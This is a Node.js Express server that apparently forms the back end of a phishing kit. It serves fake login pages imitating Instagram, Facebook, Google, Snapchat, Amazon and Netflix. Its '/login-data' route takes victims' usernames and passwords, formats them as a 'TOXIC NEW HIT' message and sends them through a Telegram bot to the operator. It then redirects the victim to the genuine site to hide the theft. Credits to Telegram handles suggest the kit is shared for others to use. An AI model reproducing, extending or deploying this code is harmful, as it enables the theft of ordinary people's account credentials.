const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const BOT_TOKEN = process.env.BOT_TOKEN;

const redirectMap = {
    'Instagram': 'https://www.instagram.com', 'Facebook': 'https://www.facebook.com',
    'Google': 'https://www.google.com', 'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com', 'Netflix': 'https://www.netflix.com'
};

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && redirectMap[service]) {
        res.sendFile(path.join(__dirname, 'pages', `${service.toLowerCase()}.html`));
    } else {
        res.status(404).send('Service Not Found.');
    }
});

app.post('/login-data', (req, res) => {
    const { username, password, service, recipientId } = req.body;
    if (!username || !password || !service || !recipientId) {
        return res.status(400).send("Invalid request. User ID is missing.");
    }
    
    if (!BOT_TOKEN) {
        return res.status(500).send("Server configuration error: BOT_TOKEN is missing.");
    }

    // NAYA UPGRADE: Timestamp Functionality
    const now = new Date();
    const date = now.toLocaleDateString('en-IN', { timeZone: 'Asia/Kolkata' });
    const time = now.toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
    const day = now.toLocaleString('en-IN', { weekday: 'long', timeZone: 'Asia/Kolkata' });

    // NAYA UPGRADE: Custom Branded Message
    const message = `
💎✨ !! TOXIC NEW HIT !! ✨💎
▬▬▬▬▬▬▬▬▬▬▬▬
🎯 **Service:** *${service}*
👤 **Username:** \`${username}\`
🔑 **Password:** \`${password}\`
▬▬▬▬▬▬▬▬▬▬▬▬
🕓 **Time:** ${time}
📅 **Date:** ${date}
🗓️ **Day:** ${day}
▬▬▬▬▬▬▬▬▬▬▬▬

MADE BY @CDMAXX
JOIN @TOXICBACK2025
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    axios.post(telegramApiUrl, {
        chat_id: recipientId,
        text: message,
        parse_mode: 'Markdown'
    })
    .then(() => res.redirect(redirectMap[service]))
    .catch(error => {
        console.error("Telegram API Error:", error.response.data);
        res.status(500).send("Error sending data to user.");
    });
});

module.exports = app;
